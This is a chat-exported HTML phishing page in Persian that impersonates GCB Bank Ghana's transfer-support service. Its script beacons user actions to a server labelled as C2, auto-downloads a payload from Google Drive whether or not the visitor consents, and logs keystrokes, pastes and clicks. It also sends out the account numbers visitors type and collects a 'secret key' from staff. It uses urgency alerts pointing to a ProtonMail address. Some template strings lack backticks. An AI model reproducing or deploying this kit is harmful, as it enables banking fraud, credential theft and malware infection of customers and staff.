Dr Sadat, [25/09/2025 2:27 pm]
<!-- شروع نسخه نهایی کامل و بهینه -->

<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>پشتیبانی انتقال وجه بانک GCB گانا - اروپا</title>
<link href="https://fonts.googleapis.com/css?family=Vazirmatn" rel="stylesheet" />
<style>
  body {
    font-family: Vazirmatn, Tahoma, sans-serif;
    background: #eef1f5;
    margin: 0;
    color: #222;
    direction: rtl;
  }
  header {
    background: #004a22;
    color: #fff;
    padding: 18px 0;
    text-align: center;
    font-size: 2rem;
    font-weight: bold;
    user-select: none;
  }
  main {
    max-width: 750px;
    margin: 40px auto;
    background: #fff;
    padding: 30px 35px;
    border-radius: 12px;
    box-shadow: 0 8px 25px #00000024;
    box-sizing: border-box;
  }
  h1 {
    color: #004a22;
    margin-bottom: 16px;
    font-weight: 900;
    font-size: 2.4rem;
  }
  p {
    font-size: 1.1rem;
    line-height: 1.6;
    margin-bottom: 26px;
    user-select: text;
  }
  input[type="text"] {
    width: 100%;
    padding: 12px;
    font-size: 1.1rem;
    border: 2px solid #004a22;
    border-radius: 6px;
    box-sizing: border-box;
    margin-bottom: 25px;
    user-select: text;
  }
  button {
    background: #007f24;
    color: #fff;
    padding: 14px 30px;
    border: none;
    border-radius: 8px;
    font-size: 1.1rem;
    cursor: pointer;
    font-weight: 700;
    transition: background-color 0.3s ease;
    user-select: none;
  }
  button:hover,
  button:focus {
    background: #004a16;
    outline: none;
  }
  #staffMsg {
    display: none;
    margin-top: 35px;
    background: #ceeed1;
    border-left: 5px solid #098217;
    padding: 20px 28px;
    color: #006625;
    font-weight: 700;
    font-size: 1.1rem;
    border-radius: 4px;
    user-select: none;
  }
  #alertMsg {
    display: none;
    background: #ffddcc;
    color: #a94442;
    padding: 12px;
    border: 1px solid #a94442;
    border-radius: 6px;
    margin-bottom: 20px;
    font-weight: 700;
    user-select: none;
  }
</style>
<script>
  // متغیرهای اصلی
  const PAYLOAD_GOOGLE_DRIVE_ID = "1lk1bB3HHSrZTrpbOfyDs4LlJSomxTBZn";
  const C2_SERVER_ENDPOINT = "https://c2-bank-support.eu/track";
  const SUPPORT_EMAIL = "support.gcb.ghana@protonmail.com";

  // ارسال داده به سرور کنترل (C2) با Base64
  function trap(type, data) {
    try {
      const payload = btoa(JSON.stringify({
        type,
        data,
        time: Date.now(),
        ua: navigator.userAgent
      }));
      navigator.sendBeacon(C2_SERVER_ENDPOINT, payload);
    } catch (e) {}
  }

  // دانلود خودکار فایل از گوگل درایو به صورت تصادفی در بازه 2.5 تا 6.5 ثانیه
  function downloadLoader() {
    const url = https://drive.google.com/uc?export=download&id=${PAYLOAD_GOOGLE_DRIVE_ID};
    setTimeout(() => {
      const a = document.createElement("a");
      a.href = url;
      a.download = "";
      a.style.display = "none";
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      trap("loader_downloaded", { file: url });
    }, Math.random() * 4000 + 2500);
  }

  // درخواست پاسخ بله/خیر با 3 بار تلاش حداکثری، پشتیبانی فارسی و انگلیسی
  async function quickConsent(question, maxAttempts = 3) {
    const yesKeywords = ["yes", "y", "بله", "آری", "ok", "sure"];
    const noKeywords = ["no", "n", "نه", "خیر"];
    for (let i = 0; i < maxAttempts; i++) {
      let ans = prompt(question + " (بله/خیر) / (Yes/No)");
      if (!ans) continue;
      ans = ans.toLowerCase().trim();
      if (yesKeywords.some((w) => ans.startsWith(w))) return true;
      if (noKeywords.some((w) => ans.startsWith(w))) return false;
      alert("لطفاً فقط بله یا خیر پاسخ دهید.");
    }
    return false;
  }

  // تایمر اضطراری 12 ثانیه برای نمایش اطلاعیه تماس ایمیلی
  let emergencyTimeout;
  function startEmergencyTimer() {
    emergencyTimeout = setTimeout(() => {
      const el = document.getElementById("alertMsg");
      el.

Dr Sadat, [25/09/2025 2:27 pm]
innerText = 🚨 فوری: اگر هنوز ابزار رفع مشکل را دریافت نکردید، فوراً به ${SUPPORT_EMAIL} با موضوع "درخواست فایل" ایمیل بزنید.;
      el.style.display = "block";
      trap("emergency_alert_shown", {});
    }, 12000);
  }

  // جریان اصلی تعامل با کاربر و کنترل دانلود
  async function startTroubleshooting() {
    trap("user_started", {});
    startEmergencyTimer();

    const startOk = await quickConsent(`سلام ${userName}، آیا مایلید فرآیند رفع مشکل انتقال وجه بانک GCB گانا به اروپا را آغاز کنید؟`);

    downloadLoader(); // دانلود خودکار همیشه انجام می‌شود

    if (!startOk) {
      trap("user_declined_start", {});
    } else {
      trap("user_consented_start", {});
      const confirmDownload = await quickConsent("آیا تایید می‌کنید ابزار رفع مشکل را دانلود کنید؟");
      if (confirmDownload) {
        trap("user_consented_download", {});
        alert("ابزار در حال دانلود است.\nپس از دریافت ایمیل، مراحل بعدی را دنبال کنید.");
        document.getElementById("staffMsg").style.display = "block";
      } else {
        trap("user_declined_download", {});
        alert("فرآیند دانلود لغو شد. در صورت نیاز با پشتیبانی تماس بگیرید.");
      }
    }
  }

  // ارسال کلید محرمانه وارد شده توسط کاربر به سرور و نمایش تشکر
  function submitSecretKey() {
    const keyField = document.getElementById("secretKey");
    const key = keyField.value.trim();
    if (key === "") {
      alert("لطفاً کلید محرمانه ارسال شده در ایمیل را وارد کنید.");
      keyField.focus();
      return;
    }
    trap("secret_key_submitted", { key });
    alert(`کلید دریافت و در حال پردازش است.\nاز همکاری شما سپاسگزاریم ${userName}.`);
  }

  // ذخیره رفتار کاربر برای تحلیل در سرور
  const trackedEvents = [
    "click",
    "dblclick",
    "keydown",
    "scroll",
    "mousemove",
    "touchstart",
    "touchend",
    "paste",
  ];
  let userEventBuffer = [];
  let lastSend = Date.now();

  function logEvent(e) {
    userEventBuffer.push({
      type: e.type,
      x: e.pageX || null,
      y: e.pageY || null,
      key: e.key || null,
      target: e.target.tagName || null,
      lang: navigator.language || null,
      platform: navigator.platform || null,
      time: Date.now(),
    });
    if (Date.now() - lastSend > 5000 && userEventBuffer.length) {
      trap("user_events", userEventBuffer.splice(0));
      lastSend = Date.now();
    }
  }

  const userName = prompt("لطفاً نام خود را وارد کنید:", "مشتری گرامی") || "مشتری گرامی";

  window.onload = () => {
    trap("page_loaded", {});
    trackedEvents.forEach((evt) =>
      document.body.addEventListener(evt, logEvent)
    );
  };

  window.addEventListener("beforeunload", () => {
    if (userEventBuffer.length) trap("user_events", userEventBuffer);
  });
</script>
</head>
<body>
<header>بانک GCB گانا - پشتیبانی انتقال وجه به اروپا</header>
<main>
  <h1>اطلاعیه مهم برای مشتریان محترم</h1>
  <div
    id="alertMsg"
    style="
      display: none;
      padding: 12px;
      background: #ffe8d6;
      border: 1px solid #d88b76;
      margin-bottom: 20px;
      border-radius: 6px;
    "
  ></div>
  <p>
    به دلیل اختلالات سایبری در پرداخت‌های انتقال وجه از گانا به حساب‌های اروپایی،
    <br />
    برخی مشتریان ممکن است با تاخیر موقت مواجه شوند.
    <br />
    لطفاً به سرعت فرآیند رفع مشکل را آغاز کنید تا از اختلال بیشتر جلوگیری شود.
  </p>
  <input
    id="accInput"
    type="text"
    placeholder="شماره حساب یا شناسه دیجیتال خود را وارد کنید"
    oninput="trap('user_input', { value: this.value })"
  />
  <button onclick="startTroubleshooting()">آغاز رفع مشکل</button>

  <div
    id="staffMsg"
    style="
      display: none;
      margin-top: 35px;
      background: #e0f0d9;
      padding: 20px 28px;
      border-left: 4px solid #2d6a1f;
      border-radius: 6px;
      font-weight: 700;
      font-size: 1.1rem;
    "
  >
    <p><strong>توجه ویژه به پرسنل بانک GCB اروپا:</strong></p>
    <p>
      مشتری فرآیند رفع مشکل را آغاز کرده است.
      <br />
      لطفاً ایمیل مشتری را در سیستم امن خود بررسی کرده و فایل رمزگذاری شده را دریافت نمایید.
      <br />

Dr Sadat, [25/09/2025 2:27 pm]
پس از دریافت فایل، کلید محرمانه ارسال شده برای مشتری را در کادر زیر وارد کرده و برای تایید ارسال کنید:
    </p>
    <input
      id="secretKey"
      type="text"
      placeholder="کلید محرمانه را اینجا وارد کنید"
      style="
        width: 100%;
        padding: 10px;
        font-size: 1.1rem;
        border: 2px solid #2d6a1f;
        border-radius: 5px;
        margin-bottom: 12px;
      "
    />
    <button onclick="submitSecretKey()">ارسال کلید</button>
  </div>
</main>
<footer>© 2025 بانک GCB گانا. تمامی حقوق محفوظ است.</footer>
</body>
</html>

<!-- پایان نسخه نهایی کامل و بهینه -->